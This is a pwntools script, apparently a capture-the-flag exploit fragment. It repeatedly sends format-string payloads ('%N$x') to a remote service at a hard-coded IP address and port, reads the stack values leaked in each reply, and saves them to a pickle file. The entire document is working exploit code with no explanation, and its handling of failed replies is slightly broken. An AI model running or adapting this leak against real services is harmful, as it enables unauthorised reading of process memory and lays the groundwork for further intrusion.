from pwn import *

context.arch = 'i386'


def create_connection():
    while True:
        try:
            return remote('13.125.44.4', 20001, timeout=3)
        except:
            continue


i = 1
mem = []
r = create_connection()
while True:
    if not r.connected:
        r = create_connection()

    data = None
    try:
        r.recvuntil(b'command :')
        r.sendline(f'%{i}$x'.encode())
        data = r.recvuntil(b'[Command Failed]', timeout=3)
        res = data.rsplit()[0]
    except:
        print(f'{i:4d} - {data}')
        r.close()
        i += 1
        continue

    if res.startswith(b'[Command'):
        res = ''

    res = int(res, 16)
    mem.append(res)

    with open('mem.pkl', 'wb') as f:
        pickle.dump(mem, f)

    i += 1
